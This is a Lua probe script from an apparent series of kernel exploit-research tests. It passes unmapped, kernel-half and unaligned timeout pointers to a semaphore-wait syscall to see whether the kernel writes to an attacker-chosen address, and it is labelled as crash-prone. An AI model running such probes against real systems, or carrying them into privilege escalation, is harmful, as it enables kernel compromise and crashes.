-- CRASH_CLASS: HIGH
-- PROBE 349d: the osem timeout pointer, and whether the kernel checks it
--
-- 349c showed 553 writing the remaining budget back through the timeout
-- pointer: 0x800 in, 0x0 out, on the path where the wait expires. That is a
-- kernel write of four bytes to an address we choose.
--
-- The AIO destination is range-checked (352j: an unmapped page and a kernel
-- half address both come back 0x8002000E). This asks whether the semaphore
-- wait applies the same check, or whether it trusts the pointer it is given.

print("=== PROBE 349d: OSEM TIMEOUT POINTER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wd(addr, value)
    pcall(function() memory.write_dword(addr, value) end)
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local tmo = memory.alloc(0x10)
local name = put_str("omp349d")
wd(tmo, 0x800)

local function call(n, a1, a2, a3, a4)
    local ok, rv = pcall(function()
        return sc(n)(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), Z, Z)
    end)
    if not ok then return nil end
    return sgn(rv)
end

local h = call(549, name, 0, 0, 4)
print(string.format("549(name,0,0,4) = %s", tostring(h)))
if not h or h == -1 then
    print("=== 349d DONE ===")
    return
end

print("[A] a valid timeout pointer, nothing available")
wd(tmo, 0x800)
local r1 = call(553, h, 1, tmo)
print(string.format("  553(h,1,tmo)      = %s  tmo=0x%X (was 0x800)", tostring(r1), rd(tmo)))

print("[B] a timeout pointer that is not mapped")
local r2 = call(553, h, 1, 0x1000)
print(string.format("  553(h,1,0x1000)   = %s", tostring(r2)))

print("[C] a timeout pointer in the kernel half")
local K = uint64(string.format("0x%X%08X", 0xFFFF8000, 0x00000000))
local r3 = call(553, h, 1, K)
print(string.format("  553(h,1,kernel)   = %s", tostring(r3)))

print("[D] an unaligned timeout pointer")
wd(tmo, 0x800)
local r4 = call(553, h, 1, uint64(tmo) + 1)
print(string.format("  553(h,1,tmo+1)    = %s  tmo=0x%X", tostring(r4), rd(tmo)))

print("[E] the control again, to prove the object is still healthy")
wd(tmo, 0x800)
print(string.format("  553(h,1,tmo)      = %s  tmo=0x%X", tostring(call(553, h, 1, tmo)), rd(tmo)))

print("")
print("=== 349d DONE ===")
